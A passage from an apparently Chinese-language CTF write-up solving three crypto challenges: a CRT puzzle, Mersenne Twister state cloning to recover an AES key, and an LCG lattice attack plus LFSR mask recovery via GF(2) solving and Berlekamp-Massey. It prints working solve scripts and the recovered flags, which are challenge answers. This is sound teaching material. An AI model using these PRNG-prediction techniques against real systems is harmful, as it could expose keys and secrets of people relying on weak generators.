class="line">19 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">20 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">21 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">22 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">23 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">24 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">25 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">26 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">27 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">28 [1, 0, 0, 1, 0, 0] 2</span><br><span class="line">29 [1, 0, 1, 0, 1, 0] 3</span><br><span class="line">30 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">31 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">32 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">33 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">34 [1, 0, 0, 0, 0, 1] 2</span><br><span class="line">35 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">36 [1, 1, 1, 0, 0, 0] 3</span><br><span class="line">37 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">38 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">39 [1, 1, 0, 1, 0, 0] 3</span><br><span class="line">40 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">41 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">42 [1, 1, 0, 0, 1, 0] 3</span><br><span class="line">43 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">44 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">45 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">46 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">47 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">48 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">49 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">50 [1, 0, 1, 1, 0, 0] 3</span><br><span class="line">51 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">52 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">53 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">54 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">55 [1, 0, 0, 0, 1, 0] 2</span><br><span class="line">56 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">57 [1, 1, 1, 0, 0, 0] 3</span><br><span class="line">58 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">59 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">60 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">61 [1, 0, 0, 1, 0, 0] 2</span><br><span class="line">62 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">63 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">64 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">65 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">66 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">67 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">68 [1, 0, 0, 0, 1, 0] 2</span><br><span class="line">69 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">70 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">71 [1, 0, 1, 0, 0, 1] 3</span><br><span class="line">72 [1, 1, 0, 1, 0, 0] 3</span><br><span class="line">73 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">74 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">75 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">76 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">77 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">78 [1, 1, 1, 0, 0, 0] 3</span><br><span class="line">79 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">80 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">81 [1, 1, 0, 0, 1, 0] 3</span><br><span class="line">82 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">83 [1, 0, 0, 1, 0, 0] 2</span><br><span class="line">84 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">85 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">86 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">87 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">88 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">89 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">90 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">91 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">92 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">93 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">94 [1, 0, 0, 1, 1, 0] 3</span><br><span class="line">95 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">96 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">97 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">98 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">99 [1, 1, 1, 0, 0, 0] 3</span><br><span class="line">100 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">101 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">102 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">103 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">104 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">105 [1, 1, 0, 1, 0, 0] 3</span><br><span class="line">106 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">107 [1, 0, 0, 0, 1, 0] 2</span><br><span class="line">108 [1, 1, 0, 0, 0, 1] 3</span><br><span class="line">109 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">110 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">111 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">112 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">113 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">114 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">115 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">116 [1, 0, 0, 1, 0, 0] 2</span><br><span class="line">117 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">118 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">119 [1, 0, 0, 0, 0, 0] 1</span><br></pre></td></tr></table></figure><h4><span id="pstep3-crt">step3 CRT</span><a href="#pstep3-crt" class="header-anchor">#</a></h4><p>可以看到以下情况为1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brain0 1</span><br><span class="line">brain1 3*i</span><br><span class="line">brain2 1+7*i</span><br><span class="line">brain3 6+11*i</span><br><span class="line">brain4 3+13*i</span><br><span class="line">brain5 34+37*i</span><br></pre></td></tr></table></figure><p>这就是求一个crt了，求x满足以下条件即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x % 3 &#x3D;&#x3D; 0</span><br><span class="line">x % 7 &#x3D;&#x3D; 1</span><br><span class="line">x % 11 &#x3D;&#x3D; 6</span><br><span class="line">x % 13 &#x3D;&#x3D; 3</span><br><span class="line">x % 37 &#x3D;&#x3D; 34</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sage: crt([0,1,6,3,34],[3,7,11,13,37])</span><br><span class="line">54720</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:~&#x2F;retools&#x2F;pin&#x2F;babybrain# python3 challenge.py</span><br><span class="line">54720 [1, 1, 1, 1, 1, 1] 6</span><br><span class="line">flag&#123;b65acea9321f62a03d4b28fe689508c6&#125;</span><br></pre></td></tr></table></figure><h3><span id="prkey">rkey</span><a href="#prkey" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#x3D;open(&quot;flag&quot;,&quot;r&quot;).read()</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import hashlib</span><br><span class="line">from Crypto.Util.number import bytes_to_long,long_to_bytes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def init(r):</span><br><span class="line">    sl&#x3D;[]</span><br><span class="line">    for _ in range(624):</span><br><span class="line">        x&#x3D;os.urandom(4)</span><br><span class="line">        sl.append(bytes_to_long(x))</span><br><span class="line">    st &#x3D; (3, tuple(sl + [0]), None)</span><br><span class="line">    r.setstate(st)</span><br><span class="line">    </span><br><span class="line">def gsu(r):</span><br><span class="line">    return r.getstate()[1][-1] % 624</span><br><span class="line"></span><br><span class="line">def ss(r,sl,u):</span><br><span class="line">    s &#x3D; (3, tuple(sl + [u]), None)</span><br><span class="line">    r.setstate(s)</span><br><span class="line"></span><br><span class="line">def gsl(r):</span><br><span class="line">    return r.getstate()[1][:-1]</span><br><span class="line"></span><br><span class="line">def renc(r,rkey):</span><br><span class="line">    sl&#x3D;gsl(r)</span><br><span class="line">    su&#x3D;gsu(r)</span><br><span class="line">    nsl&#x3D;[]</span><br><span class="line">    for i in sl:</span><br><span class="line">        nsl.append(i^rkey)</span><br><span class="line">    ss(r,nsl,su)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    init(random)</span><br><span class="line">    for _ in range(624):</span><br><span class="line">        print(random.getrandbits(32),end&#x3D;&quot;,&quot;)</span><br><span class="line">        renc(random,_%256)</span><br><span class="line">    key&#x3D;long_to_bytes(random.getrandbits(128))</span><br><span class="line">    h&#x3D;AES.new(key,AES.MODE_ECB)</span><br><span class="line">    print(h.encrypt(flag.encode().zfill(48)).hex())</span><br></pre></td></tr></table></figure><p>和普通的MT19937预测差别不大，只是题目中一直通过<code>renc</code>函数对<code>state</code>进行异或改变，所以异或恢复回来即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from random import *</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def invert_right(m, l, val&#x3D;&#39;&#39;):</span><br><span class="line">    length &#x3D; 32</span><br><span class="line">    mx &#x3D; 0xffffffff</span><br><span class="line">    if val &#x3D;&#x3D; &#39;&#39;:</span><br><span class="line">        val &#x3D; mx</span><br><span class="line">    i, res &#x3D; 0, 0</span><br><span class="line">    while i*l &lt; length:</span><br><span class="line">        mask &#x3D; (mx &lt;&lt; (length-l) &amp; mx) &gt;&gt; i*l</span><br><span class="line">        tmp &#x3D; m &amp; mask</span><br><span class="line">        m &#x3D; m ^ tmp &gt;&gt; l &amp; val</span><br><span class="line">        res +&#x3D; tmp</span><br><span class="line">        i +&#x3D; 1</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def invert_left(m, l, val):</span><br><span class="line">    length &#x3D; 32</span><br><span class="line">    mx &#x3D; 0xffffffff</span><br><span class="line">    i, res &#x3D; 0, 0</span><br><span class="line">    while i*l &lt; length:</span><br><span class="line">        mask &#x3D; (mx &gt;&gt; (length-l) &amp; mx) &lt;&lt; i*l</span><br><span class="line">        tmp &#x3D; m &amp; mask</span><br><span class="line">        m ^&#x3D; tmp &lt;&lt; l &amp; val</span><br><span class="line">        res |&#x3D; tmp</span><br><span class="line">        i +&#x3D; 1</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def invert_temper(m):</span><br><span class="line">    m &#x3D; invert_right(m, 18)</span><br><span class="line">    m &#x3D; invert_left(m, 15, 4022730752)</span><br><span class="line">    m &#x3D; invert_left(m, 7, 2636928640)</span><br><span class="line">    m &#x3D; invert_right(m, 11)</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def clone_mt(record):</span><br><span class="line">    state &#x3D; [invert_temper(i) for i in record]</span><br><span class="line">    gen &#x3D; Random()</span><br><span class="line">    gen.setstate((3, tuple(state+[0]), None))</span><br><span class="line">    return gen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init(r):</span><br><span class="line">    sl &#x3D; []</span><br><span class="line">    for _ in range(624):</span><br><span class="line">        x &#x3D; os.urandom(4)</span><br><span class="line">        sl.append(bytes_to_long(x))</span><br><span class="line">    st &#x3D; (3, tuple(sl + [0]), None)</span><br><span class="line">    r.setstate(st)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gsu(r):</span><br><span class="line">    return r.getstate()[1][-1] % 624</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ss(r, sl, u):</span><br><span class="line">    s &#x3D; (3, tuple(sl + [u]), None)</span><br><span class="line">    r.setstate(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gsl(r):</span><br><span class="line">    return r.getstate()[1][:-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def renc(r, rkey):</span><br><span class="line">    sl &#x3D; gsl(r)</span><br><span class="line">    su &#x3D; gsu(r)</span><br><span class="line">    nsl &#x3D; []</span><br><span class="line">    for i in sl:</span><br><span class="line">        nsl.append(i ^ rkey)</span><br><span class="line">    ss(r, nsl, su)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(&#39;output&#39;, &#39;r&#39;) as f:</span><br><span class="line">    numbers &#x3D; f.readline().strip().split(&#39;,&#39;)</span><br><span class="line">ciphertext &#x3D; numbers[-1]</span><br><span class="line">prng &#x3D; list(map(int, numbers[:624]))</span><br><span class="line"></span><br><span class="line">record &#x3D; prng</span><br><span class="line"></span><br><span class="line">state &#x3D; [invert_temper(i) for i in record]</span><br><span class="line">for i in range(624):</span><br><span class="line">    for j in range(0, i):</span><br><span class="line">        state[i] ^&#x3D; (j % 256)</span><br><span class="line">        </span><br><span class="line">gen &#x3D; Random()</span><br><span class="line">gen.setstate((3, tuple(state+[0]), None))</span><br><span class="line">g &#x3D; gen</span><br><span class="line">tmp &#x3D; []</span><br><span class="line">for i in range(624):</span><br><span class="line">    tmp.append(g.getrandbits(32))</span><br><span class="line">    renc(g, i % 256)</span><br><span class="line">key &#x3D; long_to_bytes(g.getrandbits(128))</span><br><span class="line"></span><br><span class="line">print(ciphertext)</span><br><span class="line">h &#x3D; AES.new(key, AES.MODE_ECB)</span><br><span class="line">print(h.decrypt(long_to_bytes(int(ciphertext, 16))))</span><br><span class="line"># b&#39;0000000000flag&#123;5FSB8f5ZRwouow77tT09V4icpflf0AIg&#125;&#39;</span><br></pre></td></tr></table></figure><h3><span id="pcrypto-linear">crypto_linear</span><a href="#pcrypto-linear" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">#from secret import flag</span><br><span class="line">from Crypto.Util.number import getPrime</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">N &#x3D; 128</span><br><span class="line">#assert flag.startswith(b&quot;flag&#123;&quot;)</span><br><span class="line">#assert flag.endswith(b&quot;&#125;&quot;)</span><br><span class="line">#assert sha256(flag.encode()).hexdigest() &#x3D;&#x3D; &#39;cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196&#39;</span><br><span class="line">flag &#x3D; &#39;flag&#123;&#39;+&#39;a&#39;*32+&#39;&#125;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def lfsr(R, mask):</span><br><span class="line">    feedback &#x3D; R &amp; mask</span><br><span class="line">    feed_bit &#x3D; bin(feedback)[2:].count(&quot;1&quot;) &amp; 1</span><br><span class="line">    output_bit &#x3D; R &amp; 1</span><br><span class="line">    state &#x3D; (R &gt;&gt; 1) | (feed_bit &lt;&lt; (N - 1))</span><br><span class="line">    return state, output_bit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_lcg(bit_length):</span><br><span class="line">    m &#x3D; getPrime(bit_length)</span><br><span class="line">    a &#x3D; random.randint(1, m)</span><br><span class="line">    b &#x3D; random.randint(1, m)</span><br><span class="line">    return (a, b, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def next(state, a, b, m):</span><br><span class="line">    return (a * state + b) % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(seed, a, b, m):</span><br><span class="line">    state &#x3D; seed</span><br><span class="line">    for i in range(32):</span><br><span class="line">        state &#x3D; next(state, a, b, m)</span><br><span class="line">        print(str(state &gt;&gt; 128))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    outputs &#x3D; &#39;&#39;</span><br><span class="line">    state &#x3D; getPrime(N)</span><br><span class="line">    print(state)</span><br><span class="line">    mask &#x3D; int(flag[5:-1], 16)</span><br><span class="line">    assert mask.bit_length() &#x3D;&#x3D; N</span><br><span class="line">    for _ in range(237):</span><br><span class="line">        state, output_bit &#x3D; lfsr(state, mask)</span><br><span class="line">        outputs +&#x3D; str(output_bit)</span><br><span class="line">    seed &#x3D; int(outputs, 2)</span><br><span class="line">    a, b, m &#x3D; gen_lcg(2*N)</span><br><span class="line">    print(a)</span><br><span class="line">    print(b)</span><br><span class="line">    print(m)</span><br><span class="line">    seed &#x3D; next(seed, a, b, m)</span><br><span class="line">    leak(seed, a, b, m)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">197234424440462279706886095021989893603</span><br><span class="line">14795840725848724233989125515381332891983447763911838803860161229073761165459</span><br><span class="line">46856731968181268756048136355293380676858169739364057598770342358628231105837</span><br><span class="line">75395323186914723695383746297731220829260297827914721397090336698050785547901</span><br><span class="line">136252050295979513578524586196889171948</span><br><span class="line">74159806199029176365391514660175453445</span><br><span class="line">149009261329273670617645548606230622069</span><br><span class="line">10804653241785352036362691068732736466</span><br><span class="line">8301866905629821931833736018745870696</span><br><span class="line">157855582728403457694964231929562653354</span><br><span class="line">178027817844712429743828235794152230122</span><br><span class="line">80034824078666750068565497570794144445</span><br><span class="line">170373875544515217159377257439355857413</span><br><span class="line">212173471024808766218767490865913392646</span><br><span class="line">95467817412140832591838699989464945653</span><br><span class="line">173475962624021238667335879772637670470</span><br><span class="line">81228038826202736980181080253070973426</span><br><span class="line">38517665965602217903989903052781616297</span><br><span class="line">46317216313784340947138237859397553178</span><br><span class="line">73480604487960250667527460166934447951</span><br><span class="line">181632542873120638719727356775589934086</span><br><span class="line">20942574859167575225267568077383208513</span><br><span class="line">38652426910419634089323803603851872337</span><br><span class="line">45320099645552147689201245689226315649</span><br><span class="line">159381067221751927173322401473016180375</span><br><span class="line">193506543095896556423712674109718555846</span><br><span class="line">104424148854666757299886973298137655262</span><br><span class="line">128843388729958406286436691041300045263</span><br><span class="line">185545719480113124900452350138120090653</span><br><span class="line">52962693230539519899467724304596006290</span><br><span class="line">174467298993457220087453407135470977097</span><br><span class="line">108748490990737778209782462542797272925</span><br><span class="line">94970284329938606345438744396772890917</span><br><span class="line">158383211690414095044606007624481697156</span><br><span class="line">35675324836784472216060017492844885509</span><br><span class="line">149209120676432244783142365900170210500</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>从题目看到，先是一个lfsr，其中flag作为mask，将结果通过一个LCG隐藏</p><h4><span id="pstep1-lcg-jie-seed">step1 LCG解seed</span><a href="#pstep1-lcg-jie-seed" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 14795840725848724233989125515381332891983447763911838803860161229073761165459</span><br><span class="line">b &#x3D; 46856731968181268756048136355293380676858169739364057598770342358628231105837</span><br><span class="line">m &#x3D; 75395323186914723695383746297731220829260297827914721397090336698050785547901</span><br><span class="line"></span><br><span class="line">h &#x3D; [0, 136252050295979513578524586196889171948,</span><br><span class="line">     74159806199029176365391514660175453445,</span><br><span class="line">     149009261329273670617645548606230622069,</span><br><span class="line">     10804653241785352036362691068732736466,</span><br><span class="line">     8301866905629821931833736018745870696,</span><br><span class="line">     157855582728403457694964231929562653354,</span><br><span class="line">     178027817844712429743828235794152230122,</span><br><span class="line">     80034824078666750068565497570794144445,</span><br><span class="line">     170373875544515217159377257439355857413,</span><br><span class="line">     212173471024808766218767490865913392646,</span><br><span class="line">     95467817412140832591838699989464945653,</span><br><span class="line">     173475962624021238667335879772637670470,</span><br><span class="line">     81228038826202736980181080253070973426,</span><br><span class="line">     38517665965602217903989903052781616297,</span><br><span class="line">     46317216313784340947138237859397553178,</span><br><span class="line">     73480604487960250667527460166934447951,</span><br><span class="line">     181632542873120638719727356775589934086,</span><br><span class="line">     20942574859167575225267568077383208513,</span><br><span class="line">     38652426910419634089323803603851872337,</span><br><span class="line">     45320099645552147689201245689226315649,</span><br><span class="line">     159381067221751927173322401473016180375,</span><br><span class="line">     193506543095896556423712674109718555846,</span><br><span class="line">     104424148854666757299886973298137655262,</span><br><span class="line">     128843388729958406286436691041300045263,</span><br><span class="line">     185545719480113124900452350138120090653,</span><br><span class="line">     52962693230539519899467724304596006290,</span><br><span class="line">     174467298993457220087453407135470977097,</span><br><span class="line">     108748490990737778209782462542797272925,</span><br><span class="line">     94970284329938606345438744396772890917,</span><br><span class="line">     158383211690414095044606007624481697156,</span><br><span class="line">     35675324836784472216060017492844885509,</span><br><span class="line">     149209120676432244783142365900170210500]</span><br><span class="line"></span><br><span class="line">for i in range(len(h)):</span><br><span class="line">    h[i] &lt;&lt;&#x3D; 128</span><br><span class="line">A &#x3D; [1]</span><br><span class="line">B &#x3D; [0]</span><br><span class="line">for i in range(1, len(h)-1):</span><br><span class="line">    A.append(a*A[i-1] % m)</span><br><span class="line">    B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)</span><br><span class="line">print(A[1:])</span><br><span class="line">print(B[1:])</span><br><span class="line"></span><br><span class="line">M &#x3D; matrix(ZZ, 33, 33)</span><br><span class="line"></span><br><span class="line">for i in range(31):</span><br><span class="line">    M[i, i] &#x3D; m</span><br><span class="line">    M[31, i] &#x3D; A[i]</span><br><span class="line">    M[32, i] &#x3D; B[i]</span><br><span class="line">    M[i, 31] &#x3D; M[i, 32] &#x3D; 0</span><br><span class="line">M[31, 31] &#x3D; 1</span><br><span class="line">M[32, 32] &#x3D; 2 ^ 128</span><br><span class="line">M[31, 32] &#x3D; 0</span><br><span class="line">vl &#x3D; M.LLL()[0]</span><br><span class="line">l1 &#x3D; vl[-2]</span><br><span class="line">h1 &#x3D; h[1]</span><br><span class="line">s1 &#x3D; l1+h1</span><br><span class="line">s0 &#x3D; ((s1 - b)*inverse_mod(a, m)) % m</span><br><span class="line">seed &#x3D; ((s0 - b)*inverse_mod(a, m)) % m</span><br><span class="line">print(seed)</span><br><span class="line"># 172249955599053439033078493520693122929584790340636422377323636607140227</span><br></pre></td></tr></table></figure><h4><span id="pstep2-bao-po-hui-fu-mask">step2 爆破恢复mask</span><a href="#pstep2-bao-po-hui-fu-mask" class="header-anchor">#</a></h4><p>题目给出了237位结果，而我们要恢复mask的话需要256位结果才行爆破，<code>2**19==524288</code>还是可以接受的，在爆破出mask（即flag）后可以通过sha256进行筛选</p><h5><span id="pctfwiki-fang-fa">ctfwiki方法</span><a href="#pctfwiki-fang-fa" class="header-anchor">#</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from sage.all_cmdline import *</span><br><span class="line">from hashlib import sha256</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">GF2 &#x3D; GF(2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(m):</span><br><span class="line">    pad_length &#x3D; 19 - len(m)</span><br><span class="line">    return pad_length*&#39;0&#39; + m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed &#x3D; 172249955599053439033078493520693122929584790340636422377323636607140227</span><br><span class="line">N &#x3D; 128</span><br><span class="line"># range(267150,267151)</span><br><span class="line">for _ in tqdm(range(2**19)):</span><br><span class="line">    a &#x3D; bin(seed)[2:]</span><br><span class="line">    a &#x3D; a + pad(bin(_)[2:])</span><br><span class="line">    #print(a, len(a))</span><br><span class="line"></span><br><span class="line">    A &#x3D; []</span><br><span class="line">    for i in range(128):</span><br><span class="line">        A.append([int(op) for op in a[i:i+128]])</span><br><span class="line">    A &#x3D; matrix(GF2, A)</span><br><span class="line">    # print A.rank()</span><br><span class="line">    if A.rank() !&#x3D; 128:</span><br><span class="line">        continue</span><br><span class="line">    last &#x3D; a[128:]</span><br><span class="line">    b &#x3D; [int(op) for op in last]</span><br><span class="line">    b &#x3D; vector(GF2, b)</span><br><span class="line"></span><br><span class="line">    mask &#x3D; A.solve_right(b)</span><br><span class="line">    sss &#x3D; &#39;&#39;</span><br><span class="line">    for x in range(128):</span><br><span class="line">        sss +&#x3D; str(mask[x])</span><br><span class="line">    sss &#x3D; sss[::-1]</span><br><span class="line">    mask &#x3D; int(sss, 2)</span><br><span class="line">    mask &#x3D; hex(mask)</span><br><span class="line">    flag &#x3D; &#39;flag&#123;&#39; + mask[2:] + &#39;&#125;&#39;</span><br><span class="line">    if sha256(flag.encode()).hexdigest() &#x3D;&#x3D; &#39;cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196&#39;:</span><br><span class="line">        print(flag)</span><br><span class="line">        exit(0)</span><br><span class="line"># flag&#123;a53bde3404aaab1dbb8412542eede2ef&#125;</span><br></pre></td></tr></table></figure><h5><span id="pbm-suan-fa">BM算法</span><a href="#pbm-suan-fa" class="header-anchor">#</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from tqdm import tqdm</span><br><span class="line">from hashlib import sha256</span><br><span class="line"># https:&#x2F;&#x2F;raw.github.com&#x2F;bozhu&#x2F;BMA&#x2F;master&#x2F;bma.py</span><br><span class="line">def Berlekamp_Massey_algorithm(sequence):</span><br><span class="line">    N &#x3D; len(sequence)</span><br><span class="line">    s &#x3D; sequence[:]</span><br><span class="line"></span><br><span class="line">    for k in range(N):</span><br><span class="line">        if s[k] &#x3D;&#x3D; 1:</span><br><span class="line">            break</span><br><span class="line">    f &#x3D; set([k + 1, 0])  # use a set to denote polynomial</span><br><span class="line">    l &#x3D; k + 1</span><br><span class="line"></span><br><span class="line">    g &#x3D; set([0])</span><br><span class="line">    a &#x3D; k</span><br><span class="line">    b &#x3D; 0</span><br><span class="line"></span><br><span class="line">    for n in range(k + 1, N):</span><br><span class="line">        d &#x3D; 0</span><br><span class="line">        for ele in f:</span><br><span class="line">            d ^&#x3D; s[ele + n - l]</span><br><span class="line"></span><br><span class="line">        if d &#x3D;&#x3D; 0:</span><br><span class="line">            b +&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            if 2 * l &gt; n:</span><br><span class="line">                f ^&#x3D; set([a - b + ele for ele in g])</span><br><span class="line">                b +&#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                temp &#x3D; f.copy()</span><br><span class="line">                f &#x3D; set([b - a + ele for ele in f]) ^ g</span><br><span class="line">                l &#x3D; n + 1 - l</span><br><span class="line">                g &#x3D; temp</span><br><span class="line">                a &#x3D; b</span><br><span class="line">                b &#x3D; n - l + 1</span><br><span class="line"></span><br><span class="line">    # output the polynomial</span><br><span class="line">    def print_poly(polynomial):</span><br><span class="line">        lis &#x3D; sorted(polynomial, reverse&#x3D;True)</span><br><span class="line">        mask &#x3D; [0]*(lis[0])</span><br><span class="line">        for i in lis[1:]:</span><br><span class="line">            mask[i] &#x3D; 1</span><br><span class="line">        mask &#x3D; &quot;&quot;.join(list(map(str, mask)))</span><br><span class="line">        mask &#x3D; mask[::-1]</span><br><span class="line">        return int(mask,2)</span><br><span class="line"></span><br><span class="line">    return (print_poly(f), l)</span><br><span class="line"></span><br><span class="line">N &#x3D; 128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    #seq &#x3D; (0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0)</span><br><span class="line">    seq &#x3D; 172249955599053439033078493520693122929584790340636422377323636607140227</span><br><span class="line">    seq &#x3D; bin(seq)[2:]</span><br><span class="line"></span><br><span class="line">    for i in tqdm(range(2**19)):</span><br><span class="line">        out &#x3D; seq + bin(i)[2:].zfill(19)</span><br><span class="line">        out &#x3D; list(map(int, list(out)))</span><br><span class="line">        (mask, span) &#x3D; Berlekamp_Massey_algorithm(out)</span><br><span class="line">        mask &#x3D; hex(mask)</span><br><span class="line">        flag &#x3D; &#39;flag&#123;&#39; + mask[2:] + &#39;&#125;&#39;</span><br><span class="line">        if sha256(flag.encode()).hexdigest() &#x3D;&#x3D; &#39;cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196&#39;:</span><br><span class="line">            print(flag)</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://www.anquanke.com/post/id/204846" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204846</a></li><li><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/crypto/Babylfsr/Code/exp.sage" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/crypto/Babylfsr/Code/exp.sage</a></li><li><a href="https://badmonkey.site/archives/mt19937.html" target="_blank" rel="noopener">https://badmonkey.site/archives/mt19937.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/#b-m" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/#b-m</a></li><li><a href="https://blog.csdn.net/qq_38154820/article/details/108212123" target="_blank" 